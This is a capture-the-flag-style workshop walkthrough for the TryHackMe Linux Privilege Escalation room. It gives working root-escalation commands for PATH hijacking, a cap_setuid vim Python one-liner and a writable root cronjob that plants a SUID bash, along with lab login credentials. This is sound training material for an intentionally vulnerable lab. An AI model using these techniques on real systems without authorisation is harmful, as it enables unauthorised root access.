# HackerFrogs AfterSchool Network Hacking Session 10
## Session Topic: Privilege Escalation Pt 2 /w TryHackMe
# Challenge 1: TryHackMe Linux Privilege Escalation
## TryHackMe Link
https://tryhackme.com/room/linprivesc
### YouTube Walkthrough Link
https://youtu.be/WjAynRexjWE?t=1066
### Method of Solve
* Step 1: Click on the Task 10 header in the TryHackMe page, then click on the green `Start Machine` button
* Steo 2: At the top of the TryHackMe page, click on the `Start AttackBox` button
* Step 3: wait 2 minutes for the machines to finish loading
* Step 4: take note of the IP address under the red `Target Machine Information` header at the top of the TryHackMe webpage. In later parts of the workshop, we will refer to this IP address as `<IP_address>`
* Step 5: In the AttackBox, click on the terminal shortcut button located at the top of the desktop (beside the orange Firefox shortcut button)
* Step 6: In the AttackBox terminal, use the following SSH command to connect to the target machine (remember to sub in the IP address from Step 4 in the place of <IP_Address>)
```
ssh karen@<IP_address>
```
When prompted, use `Password1` as the password
* Step 7: Use the following command to move into the `murdoch` user's home directory:
```
cd /home/murdoch
```
## Part A: Privilege Escalation via PATH Hijacking
We will use the PATH hijacking to abuse a service running with elevated privileges
* Step 1: In the terminal use the following command to see the contents of the root-owned `test` file
```
file test
```
This tells us that the file is an executable binary
* Step 2: Use the following command to run the binary
```
./test
```
Note that the binary is looking for a `thm` binary. Let's check the PATH variable for the terminal
* Step 3: Use the following command to look at the PATH variable
```
echo $PATH
```
These are all standard PATH directories. If we can add a writable directory to the path, we can hijack the `test` binary's dependancy on the `thm` binary by writing our own `thm` binary
* Step 4: Use the following command to add the `/home/murdoch` directory to the system PATH
```
export PATH=/home/murdoch:$PATH
```
Now when any command is run in the system, it will look for binaries in the /home/murdoch directory first
* Step 5: Use the following command start the `nano` text editor to create a malicious `thm` file
```
#!/bin/bash
bash -p
```
This Bash script will start a Bash shell, and if it's opened with the `test` binary (owned by root)
* Step 5: Save the file by using the `ctrl+x` keyboard shortcut, then the `y` key, then the `enter` key
* Step 6: Run the `test` binary again to open a root-level bash shell
```
./test
```
* Step 7: In the TryHackMe page, go to the top of the page, then shut down the target machine by clicking on the `Terminate`, then `Terminate Machine` button below the red `Target Machine Information` header
## Part B: Privilege Escalation via Capabilities
In this section, we'll be doing privilege escalation attacks via Linux Capabilities
* Step 1: In the TryHackMe webpage, open the Task 8 header, then click on the `Start Machine` button
* Step 2: After the terminal finishes initializing, use the following command to return a list of binaries with additional capabilities:
```
getcap -r / 2>/dev/null
```
There's an unusual binary with capabilities in the `/home/karen` directory, the `vim` binary
* Step 3: Use the following command to open a shell using the `vim` binary
```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```
We were able to open a root shell with the `vim` binary because it was compiled with Python support and because it had the `cap_setuid` capability, which lets it run in the context of any user
* Step 4: In the TryHackMe page, go to the top of the page, then shut down the target machine by clicking on the `Terminate`, then `Terminate Machine` button below the red `Target Machine Information` header
## Part C: Privilege Escalation via Cronjob Abuse
In this section, we'll be doing privilege esclation attacks through abusing Linux cronjobs
* Step 1: In the TryHackMe webpage, open the Task 9 header, then click on the `Start Machine` button
* Step 2: After the machine initializes, use the following command to see the scheduled cronjobs
```
cat /etc/crontab
```
We see that there is a script in our user's home directory being run as cronjob every minute
* Step 3: Take a look at the file permissions of the script file
```
ls -la
```
The `backup.sh` script is being run as the root user, but our user owns this file, so we can write whatever commands we want to it
* Step 4: Use the following commands to make the `backup.sh` file writable, then startup the `nano` text editor to modify it:
```
chmod +w backup.sh
nano backup.sh
``` 
* Step 5: Replace the contents of the script file with the following code:
```
#!/bin/bash
cp /bin/bash /home/karen/rootbash
chmod u+s /home/karen/rootbash
```
This creates a copy of the bash shell in the user's home directory, called `rootbash`, then set the binary to a SUID binary, which always runs in the conext of its owner, which is `root`
* Step 6: After a minute, use the following command to use the `rootbash` SUID binary to open a root-level shell
```
./rootbash -p
```
We use the `-p` flag to preserve the privileges from the SUID
